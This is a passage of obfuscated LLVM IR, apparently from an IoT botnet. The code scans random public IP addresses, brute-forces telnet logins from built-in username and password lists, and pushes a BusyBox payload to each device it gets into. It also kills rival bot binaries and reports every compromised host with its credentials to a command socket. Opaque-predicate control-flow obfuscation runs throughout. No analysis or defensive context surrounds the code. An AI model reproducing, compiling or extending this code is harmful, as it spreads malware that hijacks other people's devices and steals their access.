  %910 = load i32, i32* @x.71
  %911 = load i32, i32* @y.72
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %1313

; <label>:918:                                    ; preds = %106
  %919 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %920 = call i32 (i8*, i8*, ...) @sprintf(i8* %919, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %921 = load i32, i32* %6, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 0
  %925 = load i32, i32* %924, align 16
  %926 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %927 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %928 = call i64 @strlen(i8* %927) #9
  %929 = call i64 @send(i32 %925, i8* %926, i64 %928, i32 16384)
  %930 = icmp slt i64 %929, 0
  br i1 %930, label %931, label %935

; <label>:931:                                    ; preds = %918
  %932 = load i32, i32* %6, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %933
  call void @reset_telstate(%struct.telstate_t* %934)
  br label %1330

; <label>:935:                                    ; preds = %918
  call void @RemoveTempDirs()
  %936 = load i32, i32* @mainCommSock, align 4
  %937 = load i32, i32* %6, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %938
  %940 = call i8* @get_telstate_host(%struct.telstate_t* %939)
  %941 = load i32, i32* %6, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 4
  %945 = load i8, i8* %944, align 2
  %946 = zext i8 %945 to i64
  %947 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %946
  %948 = load i8*, i8** %947, align 8
  %949 = load i32, i32* %6, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 5
  %953 = load i8, i8* %952, align 1
  %954 = zext i8 %953 to i64
  %955 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %954
  %956 = load i8*, i8** %955, align 8
  %957 = call i32 (i32, i8*, ...) @sockprintf(i32 %936, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %940, i8* %948, i8* %956)
  %958 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %959 = call i32 (i8*, i8*, ...) @sprintf(i8* %958, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %960 = load i32, i32* %6, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 0
  %964 = load i32, i32* %963, align 16
  %965 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %966 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %967 = call i64 @strlen(i8* %966) #9
  %968 = call i64 @send(i32 %964, i8* %965, i64 %967, i32 16384)
  %969 = icmp slt i64 %968, 0
  br i1 %969, label %970, label %990

; <label>:970:                                    ; preds = %935
  %971 = load i32, i32* @x.71
  %972 = load i32, i32* @y.72
  %973 = sub i32 %971, 1
  %974 = mul i32 %971, %973
  %975 = urem i32 %974, 2
  %976 = icmp eq i32 %975, 0
  %977 = icmp slt i32 %972, 10
  %978 = or i1 %976, %977
  br i1 %978, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %970
  %979 = load i32, i32* %6, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %980
  call void @reset_telstate(%struct.telstate_t* %981)
  %982 = load i32, i32* @x.71
  %983 = load i32, i32* @y.72
  %984 = sub i32 %982, 1
  %985 = mul i32 %982, %984
  %986 = urem i32 %985, 2
  %987 = icmp eq i32 %986, 0
  %988 = icmp slt i32 %983, 10
  %989 = or i1 %987, %988
  br i1 %989, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %1330

; <label>:990:                                    ; preds = %935
  %991 = load i32, i32* @x.71
  %992 = load i32, i32* @y.72
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %990
  %999 = load i32, i32* @mainCommSock, align 4
  %1000 = load i32, i32* %6, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1001
  %1003 = call i8* @get_telstate_host(%struct.telstate_t* %1002)
  %1004 = load i32, i32* %6, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 4
  %1008 = load i8, i8* %1007, align 2
  %1009 = zext i8 %1008 to i64
  %1010 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1009
  %1011 = load i8*, i8** %1010, align 8
  %1012 = load i32, i32* %6, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 5
  %1016 = load i8, i8* %1015, align 1
  %1017 = zext i8 %1016 to i64
  %1018 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1017
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 (i32, i8*, ...) @sockprintf(i32 %999, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %1003, i8* %1011, i8* %1019)
  %1021 = load i32, i32* %6, align 4
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1022
  call void @advance_telstate(%struct.telstate_t* %1023, i32 8)
  %1024 = load i32, i32* @x.71
  %1025 = load i32, i32* @y.72
  %1026 = sub i32 %1024, 1
  %1027 = mul i32 %1024, %1026
  %1028 = urem i32 %1027, 2
  %1029 = icmp eq i32 %1028, 0
  %1030 = icmp slt i32 %1025, 10
  %1031 = or i1 %1029, %1030
  br i1 %1031, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %1313

; <label>:1032:                                   ; preds = %106
  %1033 = load i32, i32* @x.71
  %1034 = load i32, i32* @y.72
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %1032
  %1041 = call i64 @time(i64* null) #5
  %1042 = trunc i64 %1041 to i32
  %1043 = load i32, i32* %6, align 4
  %1044 = sext i32 %1043 to i64
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1044
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1045, i32 0, i32 7
  store i32 %1042, i32* %1046, align 16
  %1047 = load i32, i32* %6, align 4
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1048
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1049, i32 0, i32 0
  %1051 = load i32, i32* %1050, align 16
  %1052 = call i64 @send(i32 %1051, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %1053 = icmp slt i64 %1052, 0
  %1054 = load i32, i32* @x.71
  %1055 = load i32, i32* @y.72
  %1056 = sub i32 %1054, 1
  %1057 = mul i32 %1054, %1056
  %1058 = urem i32 %1057, 2
  %1059 = icmp eq i32 %1058, 0
  %1060 = icmp slt i32 %1055, 10
  %1061 = or i1 %1059, %1060
  br i1 %1061, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br i1 %1053, label %1062, label %1063

; <label>:1062:                                   ; preds = %originalBBpart289
  br label %1063

; <label>:1063:                                   ; preds = %1062, %originalBBpart289
  %1064 = load i32, i32* %6, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 0
  %1068 = load i32, i32* %1067, align 16
  %1069 = call i64 @send(i32 %1068, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.494, i32 0, i32 0), i64 7, i32 16384)
  %1070 = icmp slt i64 %1069, 0
  br i1 %1070, label %1071, label %1088

; <label>:1071:                                   ; preds = %1063
  %1072 = load i32, i32* @x.71
  %1073 = load i32, i32* @y.72
  %1074 = sub i32 %1072, 1
  %1075 = mul i32 %1072, %1074
  %1076 = urem i32 %1075, 2
  %1077 = icmp eq i32 %1076, 0
  %1078 = icmp slt i32 %1073, 10
  %1079 = or i1 %1077, %1078
  br i1 %1079, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %1071
  %1080 = load i32, i32* @x.71
  %1081 = load i32, i32* @y.72
  %1082 = sub i32 %1080, 1
  %1083 = mul i32 %1080, %1082
  %1084 = urem i32 %1083, 2
  %1085 = icmp eq i32 %1084, 0
  %1086 = icmp slt i32 %1081, 10
  %1087 = or i1 %1085, %1086
  br i1 %1087, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %1088

; <label>:1088:                                   ; preds = %originalBBpart293, %1063
  %1089 = load i32, i32* @x.71
  %1090 = load i32, i32* @y.72
  %1091 = sub i32 %1089, 1
  %1092 = mul i32 %1089, %1091
  %1093 = urem i32 %1092, 2
  %1094 = icmp eq i32 %1093, 0
  %1095 = icmp slt i32 %1090, 10
  %1096 = or i1 %1094, %1095
  br i1 %1096, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %1088
  %1097 = load i32, i32* %6, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 16
  %1102 = load i8*, i8** @Busybox_Payload, align 8
  %1103 = load i8*, i8** @Busybox_Payload, align 8
  %1104 = call i64 @strlen(i8* %1103) #9
  %1105 = call i64 @send(i32 %1101, i8* %1102, i64 %1104, i32 16384)
  %1106 = icmp slt i64 %1105, 0
  %1107 = load i32, i32* @x.71
  %1108 = load i32, i32* @y.72
  %1109 = sub i32 %1107, 1
  %1110 = mul i32 %1107, %1109
  %1111 = urem i32 %1110, 2
  %1112 = icmp eq i32 %1111, 0
  %1113 = icmp slt i32 %1108, 10
  %1114 = or i1 %1112, %1113
  br i1 %1114, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %1106, label %1115, label %1119

; <label>:1115:                                   ; preds = %originalBBpart297
  %1116 = load i32, i32* %6, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1117
  call void @reset_telstate(%struct.telstate_t* %1118)
  br label %1330

; <label>:1119:                                   ; preds = %originalBBpart297
  %1120 = load i32, i32* @mainCommSock, align 4
  %1121 = load i32, i32* %6, align 4
  %1122 = sext i32 %1121 to i64
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1122
  %1124 = call i8* @get_telstate_host(%struct.telstate_t* %1123)
  %1125 = load i32, i32* %6, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 4
  %1129 = load i8, i8* %1128, align 2
  %1130 = zext i8 %1129 to i64
  %1131 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1130
  %1132 = load i8*, i8** %1131, align 8
  %1133 = load i32, i32* %6, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 5
  %1137 = load i8, i8* %1136, align 1
  %1138 = zext i8 %1137 to i64
  %1139 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1138
  %1140 = load i8*, i8** %1139, align 8
  %1141 = call i32 (i32, i8*, ...) @sockprintf(i32 %1120, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.495, i32 0, i32 0), i8* %1124, i8* %1132, i8* %1140)
  %1142 = load i32, i32* %6, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 0
  %1146 = load i32, i32* %1145, align 16
  %1147 = load i32, i32* %3, align 4
  %1148 = load i32, i32* %6, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 9
  %1152 = load i8*, i8** %1151, align 8
  %1153 = call i32 @read_until_response(i32 %1146, i32 %1147, i8* %1152, i32 1024, i8** bitcast ([7 x i8]* @.str.496 to i8**))
  %1154 = icmp ne i32 %1153, 0
  br i1 %1154, label %1155, label %1235

; <label>:1155:                                   ; preds = %1119
  %1156 = load i32, i32* @x.71
  %1157 = load i32, i32* @y.72
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %1155
  %1164 = load i32, i32* %6, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 9
  %1168 = load i8*, i8** %1167, align 8
  %1169 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1168, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %1170 = icmp ne i32 %1169, 0
  %1171 = load i32, i32* @x.71
  %1172 = load i32, i32* @y.72
  %1173 = sub i32 %1171, 1
  %1174 = mul i32 %1171, %1173
  %1175 = urem i32 %1174, 2
  %1176 = icmp eq i32 %1175, 0
  %1177 = icmp slt i32 %1172, 10
  %1178 = or i1 %1176, %1177
  br i1 %1178, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br i1 %1170, label %1179, label %1218

; <label>:1179:                                   ; preds = %originalBBpart2101
  %1180 = load i32, i32* %6, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 3
  %1184 = load i8, i8* %1183, align 1
  %1185 = zext i8 %1184 to i32
  %1186 = icmp ne i32 %1185, 3
  br i1 %1186, label %1187, label %1218

; <label>:1187:                                   ; preds = %1179
  %1188 = load i32, i32* @mainCommSock, align 4
  %1189 = load i32, i32* %6, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 1
  %1193 = bitcast i32* %1192 to %struct.in_addr*
  %1194 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 4
  %1196 = call i8* @inet_ntoa(i32 %1195) #5
  %1197 = load i32, i32* %6, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 4
  %1201 = load i8, i8* %1200, align 2
  %1202 = zext i8 %1201 to i64
  %1203 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1202
  %1204 = load i8*, i8** %1203, align 8
  %1205 = load i32, i32* %6, align 4
  %1206 = sext i32 %1205 to i64
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1206
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1207, i32 0, i32 5
  %1209 = load i8, i8* %1208, align 1
  %1210 = zext i8 %1209 to i64
  %1211 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1210
  %1212 = load i8*, i8** %1211, align 8
  %1213 = call i32 (i32, i8*, ...) @sockprintf(i32 %1188, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.497, i32 0, i32 0), i8* %1196, i8* %1204, i8* %1212)
  %1214 = load i32, i32* %6, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 3
  store i8 3, i8* %1217, align 1
  br label %1218

; <label>:1218:                                   ; preds = %1187, %1179, %originalBBpart2101
  %1219 = load i32, i32* @x.71
  %1220 = load i32, i32* @y.72
  %1221 = sub i32 %1219, 1
  %1222 = mul i32 %1219, %1221
  %1223 = urem i32 %1222, 2
  %1224 = icmp eq i32 %1223, 0
  %1225 = icmp slt i32 %1220, 10
  %1226 = or i1 %1224, %1225
  br i1 %1226, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %1218
  %1227 = load i32, i32* @x.71
  %1228 = load i32, i32* @y.72
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %1235

; <label>:1235:                                   ; preds = %originalBBpart2105, %1119
  %1236 = load i32, i32* %6, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 7
  %1240 = load i32, i32* %1239, align 16
  %1241 = add i32 %1240, 10
  %1242 = zext i32 %1241 to i64
  %1243 = call i64 @time(i64* null) #5
  %1244 = icmp slt i64 %1242, %1243
  br i1 %1244, label %1245, label %1312

; <label>:1245:                                   ; preds = %1235
  %1246 = load i32, i32* @x.71
  %1247 = load i32, i32* @y.72
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %1245
  %1254 = load i32, i32* %6, align 4
  %1255 = sext i32 %1254 to i64
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1255
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1256, i32 0, i32 3
  %1258 = load i8, i8* %1257, align 1
  %1259 = zext i8 %1258 to i32
  %1260 = icmp ne i32 %1259, 3
  %1261 = load i32, i32* @x.71
  %1262 = load i32, i32* @y.72
  %1263 = sub i32 %1261, 1
  %1264 = mul i32 %1261, %1263
  %1265 = urem i32 %1264, 2
  %1266 = icmp eq i32 %1265, 0
  %1267 = icmp slt i32 %1262, 10
  %1268 = or i1 %1266, %1267
  br i1 %1268, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br i1 %1260, label %1269, label %1308

; <label>:1269:                                   ; preds = %originalBBpart2109
  %1270 = load i32, i32* @x.71
  %1271 = load i32, i32* @y.72
  %1272 = sub i32 %1270, 1
  %1273 = mul i32 %1270, %1272
  %1274 = urem i32 %1273, 2
  %1275 = icmp eq i32 %1274, 0
  %1276 = icmp slt i32 %1271, 10
  %1277 = or i1 %1275, %1276
  br i1 %1277, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %1269
  %1278 = load i32, i32* @mainCommSock, align 4
  %1279 = load i32, i32* %6, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1280
  %1282 = call i8* @get_telstate_host(%struct.telstate_t* %1281)
  %1283 = load i32, i32* %6, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 4
  %1287 = load i8, i8* %1286, align 2
  %1288 = zext i8 %1287 to i64
  %1289 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1288
  %1290 = load i8*, i8** %1289, align 8
  %1291 = load i32, i32* %6, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 5
  %1295 = load i8, i8* %1294, align 1
  %1296 = zext i8 %1295 to i64
  %1297 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1296
  %1298 = load i8*, i8** %1297, align 8
  %1299 = call i32 (i32, i8*, ...) @sockprintf(i32 %1278, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %1282, i8* %1290, i8* %1298)
  %1300 = load i32, i32* @x.71
  %1301 = load i32, i32* @y.72
  %1302 = sub i32 %1300, 1
  %1303 = mul i32 %1300, %1302
  %1304 = urem i32 %1303, 2
  %1305 = icmp eq i32 %1304, 0
  %1306 = icmp slt i32 %1301, 10
  %1307 = or i1 %1305, %1306
  br i1 %1307, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br label %1308

; <label>:1308:                                   ; preds = %originalBBpart2113, %originalBBpart2109
  %1309 = load i32, i32* %6, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1310
  call void @reset_telstate(%struct.telstate_t* %1311)
  br label %1312

; <label>:1312:                                   ; preds = %1308, %1235
  br label %1313

; <label>:1313:                                   ; preds = %1312, %originalBBpart285, %originalBBpart277, %750, %708, %637, %originalBBpart248, %originalBBpart236, %360, %106
  %1314 = load i32, i32* @x.71
  %1315 = load i32, i32* @y.72
  %1316 = sub i32 %1314, 1
  %1317 = mul i32 %1314, %1316
  %1318 = urem i32 %1317, 2
  %1319 = icmp eq i32 %1318, 0
  %1320 = icmp slt i32 %1315, 10
  %1321 = or i1 %1319, %1320
  br i1 %1321, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %1313
  %1322 = load i32, i32* @x.71
  %1323 = load i32, i32* @y.72
  %1324 = sub i32 %1322, 1
  %1325 = mul i32 %1322, %1324
  %1326 = urem i32 %1325, 2
  %1327 = icmp eq i32 %1326, 0
  %1328 = icmp slt i32 %1323, 10
  %1329 = or i1 %1327, %1328
  br i1 %1329, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br label %1330

; <label>:1330:                                   ; preds = %originalBBpart2117, %1115, %originalBBpart281, %931, %886, %746, %734, %677, %633, %621, %548, %460, %456, %originalBBpart216, %214, %185
  %1331 = load i32, i32* @x.71
  %1332 = load i32, i32* @y.72
  %1333 = sub i32 %1331, 1
  %1334 = mul i32 %1331, %1333
  %1335 = urem i32 %1334, 2
  %1336 = icmp eq i32 %1335, 0
  %1337 = icmp slt i32 %1332, 10
  %1338 = or i1 %1336, %1337
  br i1 %1338, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %1330
  %1339 = load i32, i32* %6, align 4
  %1340 = add nsw i32 %1339, 1
  store i32 %1340, i32* %6, align 4
  %1341 = load i32, i32* @x.71
  %1342 = load i32, i32* @y.72
  %1343 = sub i32 %1341, 1
  %1344 = mul i32 %1341, %1343
  %1345 = urem i32 %1344, 2
  %1346 = icmp eq i32 %1345, 0
  %1347 = icmp slt i32 %1342, 10
  %1348 = or i1 %1346, %1347
  br i1 %1348, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %88

; <label>:1349:                                   ; preds = %88
  %1350 = load i32, i32* @x.71
  %1351 = load i32, i32* @y.72
  %1352 = sub i32 %1350, 1
  %1353 = mul i32 %1350, %1352
  %1354 = urem i32 %1353, 2
  %1355 = icmp eq i32 %1354, 0
  %1356 = icmp slt i32 %1351, 10
  %1357 = or i1 %1355, %1356
  br i1 %1357, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %1349
  %1358 = load i32, i32* @x.71
  %1359 = load i32, i32* @y.72
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %86
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %69
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %121
  %1367 = load i32, i32* %6, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 9
  %1371 = load i8*, i8** %1370, align 8
  store i8* %1371, i8** %20, align 8
  %1372 = load i32, i32* %6, align 4
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1373
  %1375 = bitcast %struct.telstate_t* %1374 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1375, i8 0, i64 32, i32 16, i1 false)
  %1376 = load i8*, i8** %20, align 8
  %1377 = load i32, i32* %6, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 9
  store i8* %1376, i8** %1380, align 8
  %1381 = call i32 @getRandomPublicIP()
  %1382 = load i32, i32* %6, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 1
  store i32 %1381, i32* %1385, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %190
  %1386 = load i32, i32* %6, align 4
  %1387 = sext i32 %1386 to i64
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1387
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1388, i32 0, i32 4
  %1390 = load i8, i8* %1389, align 2
